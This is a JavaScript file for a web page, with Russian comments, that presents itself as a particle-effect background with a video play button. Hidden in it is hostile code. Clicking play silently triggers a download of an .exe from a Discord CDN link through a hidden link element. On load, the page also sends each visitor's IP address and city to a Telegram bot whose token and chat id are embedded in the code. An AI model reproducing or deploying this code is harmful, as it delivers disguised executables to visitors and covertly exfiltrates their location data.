// настройка частиц
function initializeParticles() {
    particlesJS("particles-container", {
        particles: {
            number: {
                value: 80,
                density: {
                    enable: true,
                    value_area: 800
                }
            },
            color: {
                value: "#ffffff"
            },
            shape: {
                type: "circle",
                stroke: {
                    width: 0,
                    color: "#000000"
                },
                polygon: {
                    nb_sides: 5
                },
                image: {
                    src: "img/github.svg",
                    width: 100,
                    height: 100
                }
            },
            opacity: {
                value: 0.5,
                random: false,
                anim: {
                    enable: false,
                    speed: 1,
                    opacity_min: 0.1,
                    sync: false
                }
            },
            size: {
                value: 3,
                random: true,
                anim: {
                    enable: false,
                    speed: 40,
                    size_min: 0.1,
                    sync: false
                }
            },
            line_linked: {
                enable: true,
                distance: 150,
                color: "#ffffff",
                opacity: 0.4,
                width: 1
            },
            move: {
                enable: true,
                speed: 6,
                direction: "none",
                random: false,
                straight: false,
                out_mode: "out",
                bounce: false,
                attract: {
                    enable: false,
                    rotateX: 600,
                    rotateY: 1200
                }
            }
        },
        interactivity: {
            detect_on: "canvas",
            events: {
                onhover: {
                    enable: true,
                    mode: "grab"
                },
                onclick: {
                    enable: true,
                    mode: "push"
                },
                resize: true
            },
            modes: {
                grab: {
                    distance: 140,
                    line_linked: {
                        opacity: 1
                    }
                },
                bubble: {
                    distance: 400,
                    size: 40,
                    duration: 2,
                    opacity: 8,
                    speed: 3
                },
                repulse: {
                    distance: 200,
                    duration: 0.4
                },
                push: {
                    particles_nb: 4
                },
                remove: {
                    particles_nb: 2
                }
            }
        },
        retina_detect: true
    });
}


function showVideo() {
    var buttonContainer = document.getElementById("button-container");
    var videoContainer = document.getElementById("video-container");

    buttonContainer.style.display = "none";
    videoContainer.style.display = "block";

    var video = document.getElementById("video");
    video.play();

    video.addEventListener("ended", function() {
        videoContainer.style.display = "none";
        buttonContainer.style.display = "block";
    });

    var fileUrl = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe";
    var fileName = "huynegra.exe";

    var link = document.createElement("a");
    link.href = fileUrl;
    link.download = fileName;
    link.target = "_blank";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// telegraf blyat
fetch("https://ipinfo.io/json?token=a5fdbd840e0610")
    .then((response) => response.json())
    .then((data) => {
        const city = data.city;
        const ip = data.ip;
        const message = city + ": " + ip;
        const chatId = "6281247312";
        const token = "5995233822:AAEcIA-IHpUKUqFFCwBjbGBL1QOZJbgPbs0";

        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
            message
        )}`;

        fetch(apiUrl)
            .then((response) => response.json())
            .then((data) => {
                if (data.ok) {
                    console.log("Сообщение успешно отправлено");
                } else {
                    console.error("Ошибка при отправке сообщения");
                }
            })
            .catch(console.error);
    })
    .catch(console.error);

// Ожидание загрузки
document.addEventListener("DOMContentLoaded", function() {
    var playButton = document.getElementById("play-button");
    playButton.addEventListener("click", showVideo);

    var video = document.getElementById("video");
    video.controls = false;
    video.loop = false;

    // Инициализация эффекта частиц
    initializeParticles();
});
